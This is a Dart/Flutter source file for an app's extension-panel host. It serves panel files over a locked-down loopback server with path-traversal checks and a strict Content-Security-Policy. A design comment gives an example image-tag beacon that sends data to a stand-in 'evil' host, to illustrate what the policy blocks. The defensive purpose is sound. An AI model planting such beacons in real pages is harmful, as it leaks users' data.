/// Extension panel host: a WebView showing one extension panel.
///
/// The panel directory is served over a loopback HTTP server (127.0.0.1,
/// ephemeral port) so relative asset paths resolve on every platform and
/// `file://` quirks are avoided. Navigation is locked to that origin.
/// The page gets `window.soraExt` (see [PanelBridge.bootstrapJs]); the
/// private JavaScript channel is the panel's only way out.
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:material_symbols_icons/symbols.dart';
import 'package:webview_all/webview_all.dart';
import 'package:webview_all_linux/webview_all_linux.dart';
import 'package:webview_all_windows/webview_all_windows.dart';

import '../../../l10n/strings.dart';
import '../../design/theme.dart';
import '../kit.dart';
import '../../sora.dart';
import '../../ext/bridge.dart';
import '../../ext/manifest.dart';
import '../../ext/store.dart';
import '../../notifications.dart';
import '../../core/link.dart';
import '../../generated/sora/core/v1/core_control.pbgrpc.dart';

/// The lockdown policy for extension panels. Panels are embedded WebViews
/// whose only sanctioned way out is the host API (the private JS channel to
/// core RPCs; net.fetch through the core exists for background workers, not
/// panels): a panel must never make its own network requests, or a
/// compromised panel exfiltrates data with a single request.
///
/// `connect-src 'none'` alone is NOT enough: it blocks only fetch/XHR,
/// WebSocket, EventSource and beacons. Subresource loads (images, media,
/// fonts, styles, workers) are governed by their own directives, so the
/// policy locks those to the panel's own origin as well: an exfiltration
/// beacon such as `<img src="https://evil/?d=...">` is refused, while the
/// panel's own bundled assets (served from the loopback server, i.e.
/// 'self') keep working. Script/style are allowed only inline or from the
/// panel's own files; forms, frames and plugins are forbidden.
const String _panelContentSecurityPolicy =
    "default-src 'self'; connect-src 'none'; img-src 'self' data: blob:; "
    "media-src 'self'; font-src 'self' data:; style-src 'self' 'unsafe-inline'; "
    "script-src 'self' 'unsafe-inline'; worker-src 'none'; object-src 'none'; "
    "base-uri 'none'; form-action 'none'; frame-src 'none'; frame-ancestors 'none'";

/// Serves one directory over loopback HTTP. Bound to 127.0.0.1 with an
/// ephemeral port; shut down when the panel closes.
///
/// The panel entry HTML gets the soraExt bootstrap injected right after
/// `<head>`, so `window.soraExt` exists before any page script runs.
///
/// Every served response carries [_panelContentSecurityPolicy]: panel
/// documents must never make their own network requests; the panel's only
/// sanctioned way out is the private JS channel (net.fetch through the core
/// exists for background workers, not panels; neither is governed by the
/// page CSP).
/// The entry HTML additionally carries the CSP meta tag injected at install
/// time (core/ext extract); the header here also covers non-entry HTML
/// files, which the navigation delegate would otherwise let the panel load
/// without any policy.
@visibleForTesting
class LocalPanelServer {
  LocalPanelServer(this.root, {required this.entry, required this.bootstrap});
  final String root;
  final String entry;
  final String bootstrap;
  HttpServer? _server;

  Future<Uri> start() async {
    final server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
    _server = server;
    server.listen(_handle);
    return Uri(scheme: 'http', host: '127.0.0.1', port: server.port);
  }

  Future<void> _handle(HttpRequest req) async {
    try {
      final path = req.uri.path;
      if (path == '/' || path.isEmpty) {
        req.response.statusCode = HttpStatus.notFound;
        await req.response.close();
        return;
      }
      // Decode each path segment and reject anything that could escape the
      // content directory: dot segments (also percent-encoded ones like
      // %2e%2e, which Uri leaves decodable in [path]) and Windows
      // separators. The segments are then re-joined lexically, so the
      // mapped file cannot leave the root no matter how File.absolute
      // treats ".." on this platform.
      final segments = <String>[];
      for (final raw in path.split('/')) {
        if (raw.isEmpty) continue;
        String seg;
        try {
          seg = Uri.decodeComponent(raw);
        } on ArgumentError {
          req.response.statusCode = HttpStatus.badRequest;
          await req.response.close();
          return;
        }
        if (seg == '.' || seg == '..' || seg.contains('/') || seg.contains('\\') || seg.contains(':')) {
          req.response.statusCode = HttpStatus.forbidden;
          await req.response.close();
          return;
        }
        segments.add(seg);
      }
      if (segments.isEmpty) {
        req.response.statusCode = HttpStatus.notFound;
        await req.response.close();
        return;
      }
      final rootCanonical = Directory(root).absolute.path;
      final file = File('$rootCanonical${Platform.pathSeparator}${segments.join(Platform.pathSeparator)}');
      final canonical = file.absolute.path;
      if (canonical != '$rootCanonical${Platform.pathSeparator}${segments.join(Platform.pathSeparator)}' &&
          !canonical.startsWith('$rootCanonical${Platform.pathSeparator}')) {
        req.response.statusCode = HttpStatus.forbidden;
        await req.response.close();
        return;
      }
      if (!await file.exists()) {
        req.response.statusCode = HttpStatus.notFound;
        await req.response.close();
        return;
      }
      final ext = canonical.split('.').last.toLowerCase();
      req.response.headers.contentType = switch (ext) {
        'html' => ContentType.html,
        'css' => ContentType('text', 'css'),
        'js' => ContentType('application', 'javascript'),
        'json' => ContentType.json,
        'svg' => ContentType('image', 'svg+xml'),
        'png' => ContentType('image', 'png'),
        'jpg' || 'jpeg' => ContentType('image', 'jpeg'),
        'webp' => ContentType('image', 'webp'),
        'woff2' => ContentType('font', 'woff2'),
        _ => ContentType.binary,
      };
      // Panel isolation (see the policy docs above): no network for panel
      // documents. Set before the body is written; error responses above
      // carry no body and need no policy.
      req.response.headers.set('Content-Security-Policy', _panelContentSecurityPolicy);
      if (ext == 'html' && _isEntry(canonical)) {
        final html = await file.readAsString();
        req.response.write(_injectBootstrap(html));
      } else {
        await req.response.addStream(file.openRead());
      }
      await req.response.close();
    } catch (_) {
      try {
        req.response.statusCode = HttpStatus.internalServerError;
        await req.response.close();
      } catch (_) {}
    }
  }

  bool _isEntry(String canonical) {
    final want =
        '${Directory(root).absolute.path}${Platform.pathSeparator}${entry.replaceAll('/', Platform.pathSeparator)}';
    return canonical == want;
  }

  String _injectBootstrap(String html) {
    const tag = '<script>';
    final script = '$tag$bootstrap</script>';
    final idx = html.toLowerCase().indexOf('<head>');
    if (idx >= 0) {
      final end = idx + '<head>'.length;
      return html.substring(0, end) + script + html.substring(end);
    }
    return script + html;
  }

  Future<void> stop() async => await _server?.close(force: true);
}

class ExtensionPanelScreen extends StatefulWidget {
  const ExtensionPanelScreen({super.key, required this.extensionId, this.panelId});
  final String extensionId;
  final String? panelId;

  @override
  State<ExtensionPanelScreen> createState() => _ExtensionPanelScreenState();
}

class _ExtensionPanelScreenState extends State<ExtensionPanelScreen> {
  WebViewController? _controller;
  LocalPanelServer? _server;
  Uri? _origin;
  late final PanelBridge _bridge;
  late ExtManifest _manifest;
  late ExtPanel _panel;
  String? _failure;
  bool _starting = false;
  int _generation = 0;
  Phase? _lastPhase;

  bool _depsReady = false;
  ExtensionStore? _storeRef;

  @override
  void initState() {
    super.initState();
    _lastPhase = null;
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    if (_depsReady) return;
    _depsReady = true;
    final store = ExtScope.of(context);
    _storeRef = store;
    final inst = store.get(widget.extensionId);
    if (inst == null || !inst.enabled || inst.manifest.panels.isEmpty) {
      setState(() => _failure = 'gone');
      return;
    }
    _manifest = inst.manifest;
    _panel = widget.panelId == null
        ? _manifest.panels.first
        : _manifest.panels.firstWhere((p) => p.id == widget.panelId, orElse: () => _manifest.panels.first);
    _bridge = PanelBridge(
      extensionId: widget.extensionId,
      granted: inst.granted.toSet(),
      getConnections: _getConnections,
      servers: _servers,
      notify: _notify,
      getSettings: () => store.getSettings(widget.extensionId),
      setSettings: (v) async {
        try {
          await store.setSettings(widget.extensionId, v);
        } on ExtStoreError catch (e) {
          // The documented bridge contract (sora-ext.d.ts, the mock):
          // a settings value the schema rejects is 'invalid-argument'.
          // Without this translation the bridge's generic catch would
          // report it as 'internal', and panels could not tell a fixable
          // value from a host failure.
          throw BridgeError('invalid-argument', e.message);
        }
      },
    );
    // Tear the panel down the moment the extension is disabled/removed.
    store.addListener(_onStoreChanged);
    _start();
  }

  void _onStoreChanged() {
    if (!mounted) return;
    final inst = ExtScope.of(context).get(widget.extensionId);
    if (inst == null || !inst.enabled) {
      Navigator.of(context).maybePop();
    }
  }

  @override
  void dispose() {
    _storeRef?.removeListener(_onStoreChanged);
    _generation++;
    try {
      SoraScope.read(context).removeListener(_onSoraPhase);
    } catch (_) {}
    final controller = _controller;
    _controller = null;
    if (controller != null) unawaited(_releaseController(controller));
    unawaited(_server?.stop());
    super.dispose();
  }

  Future<void> _releaseController(WebViewController controller) async {
    try {
      await switch (controller.platform) {
        final LinuxWebViewController native => native.dispose(),
        final WindowsWebViewController native => native.dispose(),
        _ => controller.clearCache(),
      };
    } catch (error) {
      debugPrint('Extension panel cleanup failed: $error');
    }
  }

  Future<List<Map<String, dynamic>>> _getConnections() async {
    final sora = SoraScope.read(context);
    final link = sora.link, session = sora.sessionId;
    if (link == null || session == null) throw BridgeError('not-connected', 'no session');
    final answer = await link.stub.listConnections(
      ListConnectionsRequest(apiVersion: apiVersion, controlAuthenticator: link.token, sessionId: session),
    );
    return [
      for (final c in answer.connections)
        {
          'id': c.id,
          'process': c.process,
          'host': c.host,
          'up_bytes': c.upload.toInt(),
          'down_bytes': c.download.toInt(),
        },
    ];
  }

  List<Map<String, dynamic>> _servers() {
    final sora = SoraScope.read(context);
    // The documented panel API shape (docs/extensions-api.md, mirrored by
    // sora-ext.d.ts and the Go host): {id, name, country, latency_ms}.
    // The app state has no country for a server, so country is '' (the
    // Go host's proto default too) instead of an invented value; latency
    // comes from the probe results keyed by canonical outbound id, and
    // is -1 ("unknown") when unmeasured or unreachable (a null entry).
    return [
      for (final s in sora.servers)
        {'id': s.id, 'name': s.displayName, 'country': '', 'latency_ms': sora.latency[s.id] ?? -1},
    ];
  }

  Future<void> _notify(String title, String body) async {
    final sora = SoraScope.read(context);
    await sora.recordNotification(
      AppNotification(time: DateTime.now(), title: '${_manifest.name}: $title', body: body),
    );
  }

  Future<void> _start() async {
    if (_starting || !mounted || _failure != null) return;
    _starting = true;
    final generation = ++_generation;
    WebViewController? prepared;
    var retained = false;
    try {
      final store = ExtScope.of(context);
      final dir = store.contentDir(widget.extensionId);
      if (dir.isEmpty) throw StateError('gone');
      _server = LocalPanelServer(dir, entry: _panel.entry, bootstrap: PanelBridge.bootstrapJs);
      _origin = await _server!.start();
      if (!mounted || generation != _generation) {
        await _server?.stop();
        return;
      }
      final controller = WebViewPlatform.instance is LinuxWebViewPlatform
          ? WebViewController.fromPlatformCreationParams(
              const LinuxWebViewControllerCreationParams(
                pageCacheEnabled: false,
                mediaPlaybackRequiresUserGesture: true,
                javascriptCanOpenWindowsAutomatically: false,
              ),
            )
          : WebViewController();
      prepared = controller;
      await controller.setJavaScriptMode(JavaScriptMode.unrestricted);
      if (!mounted || generation != _generation) return;
      await controller.setNavigationDelegate(
        NavigationDelegate(
          onNavigationRequest: (request) {
            final uri = Uri.tryParse(request.url);
            final ok = uri != null && uri.scheme == 'http' && uri.host == '127.0.0.1' && uri.port == _origin!.port;
            return ok ? NavigationDecision.navigate : NavigationDecision.prevent;
          },
          onPageFinished: (url) async {
            if (!mounted || generation != _generation) return;
            // The bootstrap is injected by the local server, so window.soraExt
            // already exists; just announce readiness.
            await _pushEvent('panel.ready', '');
          },
        ),
      );
      if (!mounted || generation != _generation) return;
      await controller.addJavaScriptChannel(
        PanelBridge.channelName,
        onMessageReceived: (message) async {
          if (!mounted || generation != _generation) return;
          String reply;
          try {
            reply = await _bridge.handle(message.message);
          } catch (_) {
            reply = '{"ok":false,"error":"internal"}';
          }
          Map<String, dynamic> decoded;
          try {
            decoded = jsonDecode(reply) as Map<String, dynamic>;
          } catch (_) {
            return;
          }
          final id = decoded['id'];
          final ok = decoded['ok'] == true;
          final payload = ok ? decoded['result'] : decoded['error'];
          try {
            await controller.runJavaScript(
              'window.soraExt && window.soraExt._resolve(${jsonEncode(id)}, ${ok ? 'true' : 'false'}, ${jsonEncode(payload)})',
            );
          } catch (_) {}
        },
      );
      if (!mounted || generation != _generation) return;
      setState(() => _controller = controller);
      retained = true;
      await controller.loadRequest(_origin!.resolve(_panel.entry));
      if (!mounted || generation != _generation) return;
      _watchSora();
    } catch (_) {
      if (mounted && generation == _generation) {
        setState(() => _failure = 'load');
      }
    } finally {
      if (!retained && prepared != null) await _releaseController(prepared);
      _starting = false;
    }
  }

  void _watchSora() {
    final sora = SoraScope.read(context);
    _lastPhase = sora.phase;
    sora.addListener(_onSoraPhase);
  }

  void _onSoraPhase() {
    if (!mounted) return;
    final phase = SoraScope.read(context).phase;
    if (phase == _lastPhase) return;
    _lastPhase = phase;
    if (phase == Phase.connected) {
      unawaited(_pushEvent('session.connected', ''));
    } else if (phase == Phase.off) {
      unawaited(_pushEvent('session.disconnected', ''));
    }
  }

  Future<void> _pushEvent(String kind, String detail) async {
    final c = _controller;
    if (c == null || !mounted) return;
    try {
      await c.runJavaScript('window.soraExt && window.soraExt._event(${jsonEncode(kind)}, ${jsonEncode(detail)})');
    } catch (_) {}
  }

  @override
  Widget build(BuildContext context) {
    final s = S.of(context), palette = Palette.of(context);
    final title = _failure == null ? _panel.title : s.extensions;
    return Screen(
      title: title,
      fill: _failure != null
          ? Center(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Symbols.extension_off_rounded, size: 40, color: palette.ink3),
                  const SizedBox(height: 12),
                  Text(
                    s.extPanelUnavailable,
                    style: Styles.body.copyWith(color: palette.ink2),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            )
          : _controller == null
          ? const Center(child: CircularProgressIndicator())
          : WebViewWidget(controller: _controller!),
      children: const [],
    );
  }
}
